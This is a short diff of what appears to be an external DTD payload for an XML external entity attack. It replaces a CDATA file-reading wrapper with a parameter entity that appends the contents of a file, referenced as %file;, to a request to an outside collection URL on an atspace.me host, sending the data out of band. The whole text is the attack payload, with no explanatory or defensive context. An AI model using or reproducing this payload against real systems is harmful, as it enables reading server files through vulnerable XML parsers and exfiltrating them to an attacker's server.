@@ -1,4 +1,2 @@
-
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://f10-preview.atspace.me/webservice.com/collect.php?data=%file;'>">
+%all;
